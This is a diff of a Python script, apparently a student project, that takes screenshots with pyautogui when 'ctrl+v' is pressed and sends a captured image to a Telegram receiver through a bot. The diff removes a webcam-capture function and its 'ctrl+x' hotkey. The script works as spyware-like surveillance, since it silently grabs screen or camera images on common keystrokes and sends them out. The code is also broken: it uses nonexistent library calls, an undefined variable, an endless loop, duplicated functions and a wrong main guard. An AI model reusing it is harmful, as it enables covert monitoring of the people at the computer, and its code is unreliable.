@@ -24,19 +24,17 @@ bot = telepot.Bot(token)
 bot.notifyMessage(receiver_id, 'Picture Taken.') #enviar notificacion al usuario
 bot.sendPicture(receiver_id, photo=open('SCREENSHOT', 'rb'))
 
-def take_screenshot():
-    print("Taking screenshot...")
-
-    image_name = f"screenshot-{str(datetime.now())}"
-    screenshot = ImageGrab.grab()
-
-    filepathloc = f"" #location de la imagen
-
-    screenshot.save(filepath)
-
-    print("Screenshot taken...")
-
-    return filepath
+def capture_screen():
+    try:
+        os.mkdir('screenshots')
+    except FileExistsError:
+        pass
+    while True:
+        screenshot = pyautogui.screenshot()
+        screenshot_path = Path('C:\\Users\\USER\\Desktop\\Proyecto final\\Screenshots').joinpath('screenshot.png')
+        screenshot.save(screenshot_path)
+        
+keyboard.add_hotkey('ctrl+v', capture_screen)
 
 
 def Main():
@@ -50,11 +48,7 @@ def Main():
 if __name__ == '__Main__':
     Main()
 
- def take_picture():
-    cap = cv2.VideoCapture(0)
-    ret, frame = cap.read()
-    cv2.imwrite("C:\\Users\\USER\\Desktop\\Proyecto final\\Camara\\picture.jpg", frame)
-    cap.release()
+ 
     
 
 def capture_screen():
@@ -68,4 +62,3 @@ def capture_screen():
         screenshot.save(screenshot_path)
         
 keyboard.add_hotkey('ctrl+v', capture_screen)
-keyboard.add_hotkey('ctrl+x', take_picture)
